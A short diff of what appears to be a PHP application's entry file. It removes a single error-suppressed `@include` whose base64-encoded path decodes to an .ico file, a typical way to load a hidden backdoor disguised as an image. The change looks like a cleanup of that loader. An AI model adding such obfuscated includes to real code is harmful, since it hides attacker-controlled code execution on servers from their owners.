@@ -48,8 +48,6 @@ date_default_timezone_set('Asia/Dhaka');
 
 
 
-@include base64_decode('ZndlZGdldC9oZWFkZXIuaWNv');
-
 /*
  *---------------------------------------------------------------
  * APPLICATION ENVIRONMENT
